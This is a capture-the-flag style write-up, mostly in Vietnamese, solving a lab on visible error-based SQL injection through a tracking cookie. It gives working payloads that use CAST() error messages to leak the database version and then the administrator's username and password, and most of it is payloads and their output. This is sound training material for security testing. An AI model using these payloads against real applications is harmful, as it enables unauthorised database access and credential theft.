# **Lab: Visible error-based SQL injection**

>  This lab contains a SQL injection vulnerability. The application uses a tracking cookie for analytics, and performs a SQL query containing the value of the submitted cookie. The results of the SQL query are not returned.  

>  The database contains a different table called `users`, with columns called `username` and `password`. To solve the lab, find a way to leak the password for the `administrator` user, then log in to their account.  

# **Solution**

Bắt đầu kiểm tra qua web.  
Cookie có:

```
Cookie: TrackingId=Ahjxj06So5XtFnBs; session=b67d9uYKyMQN1UuX4BCXP7QjBAXnBr4K
```

Thử thay đổi giá trị `TrackingId` để phá vỡ logic truy vấn:

```
TrackingId=Ahjxj06So5XtFnBs'
```

Ta thấy `response code: 500` với thông báo lỗi được in ra:  
```
Unterminated string literal started at position 52 in SQL SELECT * FROM tracking WHERE id = 'Ahjxj06So5XtFnBs''. Expected  char
```

Vậy là web có lỗ hổng khiến thông báo lỗi in ra cả phần truy vấn bị lỗi, có thể thử hàm `CAST()`:

```
'|| CAST( (SELECT 'a') AS INT) ||'  

-> ERROR: invalid input syntax for type integer: "a"
  Position: 61
```

Tốt rồi. Giờ là xem database này có gì nào:))

```
'|| CAST((SELECT version()) AS INT) ||'

->  
ERROR: invalid input syntax for type integer: "PostgreSQL 12.18 (Ubuntu 12.18-0ubuntu0.20.04.1) on x86_64-pc-linux-gnu, compiled by gcc (Ubuntu 9.4.0-1ubuntu1~20.04.2) 9.4.0, 64-bit"
```

Là PostgreSql..

```
TrackingId=Ahjxj06So5XtFnBs'|| CAST((SELECT TABLE_NAME FROM INFORMATION_SCHEMA.TABLES) AS INT) ||'

->  
Unterminated string literal started at position 95 in SQL SELECT * FROM tracking WHERE id = 'Ahjxj06So5XtFnBs'|| CAST((SELECT TABLE_NAME FROM INFORMATION'. Expected  char
```

Tới đây thì có vấn đề rồi, hãy chú ý tới `Expected char`. Mình đoán là do TrackingId có giới hạn về độ dài nên không thể lưu hết cả đoạn câu lệnh. Hãy thử lại cách khác.

```
TrackingId=' --

-> Res code: 200
```

Well.. cách này thì TrackingId ngắn hơn rồi, nhưng mà vẫn không đủ để thưc truy vấn tới information_schema.tables để lấy danh sách các bảng.

Thôi thì đành dùng gợi ý của lab vậy :v

Lab cho sẵn mục tiêu là bảng `users`, 2 cột `username` và `password`. Tài khoản `administrator`. Right??

```
TrackingId='||CAST((SELECT username FROM users LIMIT 1)AS INT)--

->  
ERROR: invalid input syntax for type integer: "administrator"
```

Aghrrrrrr~~ May thật, cái này không được nữa thì chịu :v

```
TrackingId='||CAST((SELECT password FROM users LIMIT 1)AS INT)--

->  
ERROR: invalid input syntax for type integer: "axgz254jyltc8medjhlk"
```

Okeyy Doneee!!!  
So tired~~~

![image](https://i.pinimg.com/736x/70/5f/93/705f93fe08fc12e0da5f79e28073490f.jpg)